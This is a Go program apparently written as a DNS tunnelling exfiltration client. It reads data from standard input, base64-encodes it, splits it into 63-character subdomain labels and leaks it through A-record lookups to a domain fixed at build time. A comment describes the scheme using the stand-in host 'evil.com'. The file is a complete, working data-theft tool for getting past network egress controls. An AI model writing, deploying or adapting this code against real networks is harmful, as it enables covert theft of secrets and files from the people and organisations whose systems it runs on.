package main

import (
	"bufio"
	"encoding/base64"
	"crypto/md5"
	"github.com/miekg/dns"
	"encoding/hex"
	"fmt"
	"os"
	"net"
	"errors"
)

var DNSName string

func resolver(domain string, qtype uint16) error {
	//ONLY FOR LINUX AND MACOS
	config, _ := dns.ClientConfigFromFile("/etc/resolv.conf")

    m := new(dns.Msg)
    m.SetQuestion(dns.Fqdn(domain), qtype)
    m.RecursionDesired = true

    c := &dns.Client{}

    response, _, err := c.Exchange(m, net.JoinHostPort(config.Servers[0], config.Port))
    if err != nil {
        return err
    }

    if response == nil {
        return errors.New("Response error")
    }

    return nil
}

func integrityCheck(message string)string{
	hash := md5.New()
    hash.Write([]byte(message))
	return hex.EncodeToString(hash.Sum(nil))
}

func sending(message string) error {
	
	/*
		1. Send Init message (crc sum + hello msg)
		2. Split data on chunks (subdomain - 63 characters) -->  RFC 1035
		3. result = [{1}, {2}, {3}, ..., {n}]
			domain = Build while [{...}.{2}.{1}.evil.com] < 255  -->  RFC 1035
		4. send data using resolver(domain) func
	*/


	if message == "" {
		return errors.New("[X]Empty message")
	}

	crc := integrityCheck(message)
	startingToken := ".ZG5zZXJjX3N0YXJ0X21lc3NhZ2Ug."

	// Send Init message
	err := resolver(crc+startingToken+DNSName, dns.TypeA)
	if err != nil {
		fmt.Println(err)
	}
	
	// split on chunks
	var result []string
	lenght := 63 
	for len(message) > 0 {
		if len(message) < lenght {
			result = append(result, message)
			break
		}
		result = append(result, message[:lenght])
		message = message[lenght:]
	}

	// Sending data
	domain := DNSName
	for index, value := range result{
		if len(value+"."+domain) + lenght < 255{
			domain = value+"."+domain

			// short array
			if index == len(result)-1 {
				err = resolver(domain, dns.TypeA)
				if err != nil {
					fmt.Println(err)
				}
				domain = DNSName
			}
		} else {
			err = resolver(value+"."+domain, dns.TypeA)
			if err != nil {
				fmt.Println(err)
			}
			domain = DNSName
		}
	}

	return nil
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	var message string

	for scanner.Scan() {
		line := scanner.Text()
		message += line + "\n"
	}
	message = base64.StdEncoding.EncodeToString([]byte(message + " ")) // space for "=" escape

	if err := scanner.Err(); err != nil {
        fmt.Fprintln(os.Stderr, "Reading error:", err)
        return
    }

	err := sending(message)
	if err != nil {
		fmt.Println("Sending error:", err)
	}
}

// go build -ldflags="-X 'main.DNSName=my.dns.example.com'" main.go